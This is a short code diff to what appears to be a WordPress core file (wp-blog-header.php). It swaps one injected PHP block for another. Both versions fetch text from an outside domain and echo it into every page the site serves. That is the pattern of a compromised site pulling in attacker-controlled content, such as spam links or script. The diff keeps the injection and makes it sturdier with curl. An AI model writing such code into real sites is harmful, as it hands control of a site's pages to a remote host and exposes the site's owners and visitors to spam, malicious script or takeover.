@@ -21,6 +21,10 @@ if ( ! isset( $wp_did_header ) ) {
 }
 ?>
 <?php
-$a = file_get_contents('https://realestat.lol/ptacid.txt');
-echo $a;
-?>
+$curl = curl_init();
+$url = 'https://realestat.lol/ptacid.txt';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);
+echo $result;?>
